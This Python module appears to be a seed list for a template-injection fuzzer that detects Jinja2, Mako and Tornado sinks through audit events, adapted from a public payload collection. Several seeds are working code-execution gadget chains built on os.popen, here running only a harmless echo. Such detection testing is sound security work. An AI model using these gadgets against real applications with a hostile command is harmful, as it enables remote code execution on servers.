"""template sink-family seeds (Jinja2, Mako, Tornado).

Two strategies:
1. Literal embedding — marker as a string literal in the template body, so
   it lands in the compiled-template Python source the engine passes to
   `compile()`. Fires `code_exec` audit event with marker in args.
2. RCE gadget chain — `cycler.__init__.__globals__.os.popen(...)`,
   `''.__class__.__mro__[?].__subclasses__()[?](...)`, etc. Marker travels
   as the gadget argument; fires `process` family events when the gadget
   chain reaches `os.popen` / `subprocess.Popen`.

Strategy 1 is the most reliable; Strategy 2 is version-fragile (subclass
indices change between Python releases) but gives stronger evidence when
it lands.

Source: PayloadsAllTheThings — Server Side Template Injection / Python
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
"""

from __future__ import annotations

SEEDS: list[str] = [
    # --- Jinja2 — literal embedding (compile-time marker)
    "{{ '{MARKER}' }}",
    "{{ 1 + 1 }} {MARKER}",
    "{% if 1 %}{MARKER}{% endif %}",
    "{% set x = '{MARKER}' %}{{ x }}",
    # --- Jinja2 — RCE gadgets that don't require request context
    "{{ cycler.__init__.__globals__.os.popen('echo {MARKER}').read() }}",
    "{{ joiner.__init__.__globals__.os.popen('echo {MARKER}').read() }}",
    "{{ namespace.__init__.__globals__.os.popen('echo {MARKER}').read() }}",
    "{{ lipsum.__globals__['os'].popen('echo {MARKER}').read() }}",
    # --- Jinja2 — class-walking gadget (subclass index varies; probe form)
    "{{ ''.__class__.__mro__[1].__subclasses__() | length }} {MARKER}",
    # --- Jinja2 — debug / introspection (not RCE; marker in compiled source)
    "{% set x = config %}{{ '{MARKER}' }}",
    # --- Mako
    "${ '{MARKER}' }",
    "<%! import os %>${os.popen('echo {MARKER}').read()}",
    # --- Tornado (Jinja2 brace syntax, distinct engine — vary for diversity)
    "{% raw '{MARKER}' %}",
]
